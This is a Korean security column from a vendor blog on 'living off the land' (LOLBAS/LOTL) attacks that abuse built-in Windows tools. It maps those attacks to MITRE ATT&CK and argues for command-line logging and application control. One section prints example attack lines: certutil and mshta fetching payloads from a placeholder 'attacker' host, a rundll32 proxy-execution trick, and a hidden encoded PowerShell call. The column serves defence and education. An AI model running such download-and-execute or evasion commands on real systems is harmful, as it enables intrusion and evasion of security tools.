---
title: "지금 해킹을 이해하려면, LOLBAS부터 다시 봐야 한다"
date: 2026-04-08
draft: false
featured_image: "cdn/column/news-lolbas-understanding-attack.png"
description: "오늘날 해킹은 더 이상 악성코드 중심이 아니다. 운영체제에 내장된 정상 도구를 활용하는 LOLBAS/LOTL 공격이 중심이 되었으며, 이를 이해하지 못하면 어떤 보안 제품도 제대로 대응할 수 없다."
tags: ["LOLBAS", "LOTL", "MITRE ATT&CK", "EDR", "보안칼럼", "행위기반탐지", "디지털포렌식", "침해사고대응", "PLURA-Blog"]
---

오늘의 해킹을 이해하려면  
이제 악성코드만 봐서는 부족하다.

오히려 더 위험한 것은  
운영체제에 원래 들어 있는 정상 도구들이다.

공격자는 새로운 파일을 들여오지 않는다.  
이미 시스템 안에 존재하는 도구만으로  
다운로드하고, 실행하고, 우회하고, 흔적을 최소화한다.

이것이 바로  
**LOLBAS(Living Off the Land Binaries And Scripts)**,  
그리고 더 넓은 개념의 **LOTL(Living Off The Land)** 공격이다.

---

## 왜 지금 LOLBAS를 이해해야 하는가

많은 조직은 여전히 해킹을  
“악성코드 유입 → 실행 → 탐지”라는 구조로 이해한다.

하지만 실제 공격은 이미 바뀌었다.

- 파일 없이 실행된다  
- 정상 프로세스로 동작한다  
- 기존 보안 정책을 그대로 통과한다  
- 로그가 없으면 흔적이 거의 남지 않는다  

예를 들어 공격자는 다음과 같은 도구를 사용한다.

- `powershell.exe`
- `mshta.exe`
- `rundll32.exe`
- `certutil.exe`
- `wmic.exe`

이 도구들은 모두 정상이다.  
문제는 **어떻게 사용되느냐**다.

---

## 실제 공격에서 어떻게 악용되는가

다음은 실제 공격에서 자주 사용되는 방식이다.

### 1. 외부 코드 다운로드 (certutil)

```bash
certutil.exe -urlcache -split -f http://attacker/payload.exe payload.exe
```

→ 정상 인증 도구를 이용해 악성 파일 다운로드

---

### 2. 파일 없이 원격 코드 실행 (mshta)

```bash
mshta.exe http://attacker/payload.hta
```

→ 디스크에 파일을 남기지 않고 직접 실행

---

### 3. 정상 프로세스를 통한 실행 우회 (rundll32)

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ..."
```

→ 서명된 바이너리를 이용해 탐지 우회

---

### 4. PowerShell 기반 메모리 공격

```bash
powershell -nop -w hidden -enc <base64>
```

→ 파일 없이 메모리에서 실행

---

이 모든 행위는  
“정상 프로그램 사용”으로 보인다.

하지만 실제로는  
**완전한 공격 시나리오의 일부**다.

---

## 공격 흐름은 이렇게 이어진다

LOLBAS 공격은 개별 이벤트가 아니라  
**연결된 흐름**이다.

| 단계 | 행위      | 도구                    |
| -- | ------- | --------------------- |
| 1  | 초기 실행   | powershell            |
| 2  | 외부 접속   | powershell / certutil |
| 3  | 코드 다운로드 | certutil              |
| 4  | 실행 우회   | rundll32              |
| 5  | 지속성 확보  | schtasks / registry   |
| 6  | 권한 상승   | wmic / service        |

각각은 정상이다.  
하지만 연결되면 공격이다.

---

## 백신과 EDR이 놓치는 이유

전통적인 보안 솔루션은  
“악성 파일”을 전제로 한다.

하지만 LOLBAS 공격은 다르다.

* 악성 파일 없음
* 정상 프로세스 사용
* 합법적 실행

결과는 명확하다.

> 탐지하지 못하거나,  
> 탐지해도 의미를 이해하지 못한다.

이처럼 정상 파일을 악용하면  
기존 백신으로는 탐지가 거의 불가능하다.

---

## MITRE ATT&CK 관점에서 보면 이미 정의된 공격이다

LOLBAS는 새로운 개념이 아니다.  
이미 MITRE ATT&CK에서 핵심적으로 다루고 있다.

* T1059 (Command Execution)
* T1218 (Signed Binary Proxy Execution)
* T1105 (Ingress Tool Transfer)

즉, 공격자는 새로운 것을 만드는 것이 아니라  
**이미 정의된 기법을 그대로 활용**하고 있다.

---

## LOLDrivers: 커널까지 내려간 공격

문제는 여기서 끝나지 않는다.

최근 공격은 사용자 영역을 넘어  
**드라이버 레벨**(커널)까지 확장되고 있다.

* 서명된 취약 드라이버 로드
* 보안 제품 우회
* 커널 권한 확보

이것이 바로 **LOLDrivers**다.

이 단계에서는  
일반적인 사용자 영역 탐지로는 대응이 매우 어렵다.

---

## 그래서 필요한 것은 LOLHardening이다

탐지만으로는 부족하다.  
사전 통제가 필요하다.

LOLBAS 대응의 핵심은 다음이다.

* 특정 도구 실행 제한 (WDAC 등)
* 명령어 기반 제어
* 실행 경로 제한
* 정책 기반 차단

즉,

> **정상 도구라도 위험하게 사용되면 차단해야 한다**

이것이 바로 LOLHardening이다.

---

## 그래서 로그가 핵심이 된다

LOLBAS 공격은  
파일이 아니라 행위다.

따라서 로그 없이는  
이해도, 대응도 불가능하다.

필수 로그는 다음과 같다.

### 운영체제

* Process + CommandLine
* 계정 / 권한 변경
* 서비스 / 스케줄러
* 네트워크 연결

### 웹

* Request / Response Body
* 인증 흐름
* 다운로드 / 업로드
* 데이터 조회

---

## LOTL 시대, 보안의 기준이 바뀐다

과거:

* 악성코드 탐지

현재:

* 행위 이해
* 공격 흐름 분석
* 재구성 능력

즉,

> **차단 중심 → 이해 중심**

---

## 지금 당장 점검해야 할 3가지

이 글을 읽고 반드시 확인해야 할 것은 다음이다.

### 1. CommandLine 로그가 남고 있는가

→ powershell, rundll32 행위는 여기서만 보인다

### 2. 정상 도구 실행을 통제하고 있는가

→ WDAC, 정책 기반 차단 여부

### 3. 공격 흐름을 재구성할 수 있는가

→ 개별 이벤트가 아니라 연결 분석 가능 여부

---

## 맺음말

지금의 해킹은  
악성코드 중심이 아니다.

정상 도구 기반 공격,  
즉 LOLBAS / LOTL 시대다.

이 구조를 이해하지 못하면  
어떤 보안 제품도 제대로 대응할 수 없다.

> **LOLBAS를 이해하지 못한다면  
> 보안은 결국 놓치게 된다**

그리고 그 출발점은 단 하나다.

**기록이다.**

---

## 함께 읽기

* [[전자신문] 보안의 출발점은 기록이다](https://blog.plura.io/ko/column/news-cybersecurity-begins-with-logging/)
* [MITRE ATT&CK 프레임워크에 대한 이해: 왜 LOLBAS와 LOLDrivers도 ATT&CK 관점으로 봐야 하는가](https://blog.plura.io/ko/column/mitre-attack-framework-understanding/)

---

## 원문 뉴스

이 글은 아래 네이버 뉴스 기고문을 바탕으로  
PLURA-Blog 형식에 맞게 확장·재구성한 내용입니다.

- **전자신문 / 네이버 뉴스**
- https://n.news.naver.com/article/030/0003415789?sid=105

---
